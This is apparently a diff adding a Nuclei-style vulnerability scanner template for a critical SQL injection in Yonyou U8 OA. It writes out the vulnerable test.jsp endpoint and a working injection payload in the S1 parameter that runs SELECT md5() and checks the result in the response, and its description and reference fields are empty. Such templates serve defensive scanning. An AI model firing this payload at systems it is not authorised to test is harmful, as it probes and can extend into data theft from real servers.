@@ -1,0 +1,30 @@
+id: yonyou-u8-oa-sqli
+
+info:
+  name: Yonyou U8 - SQL Injection
+  author: HuanXiong
+  severity: critical
+  description: |-
+    
+  reference:
+    - 
+  tags: SQL Injection
+
+variables:
+  num: "999999999"
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5({{num}}))'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '{{md5({{num}})}}'
+
+      - type: status
+        status:
+          - 200
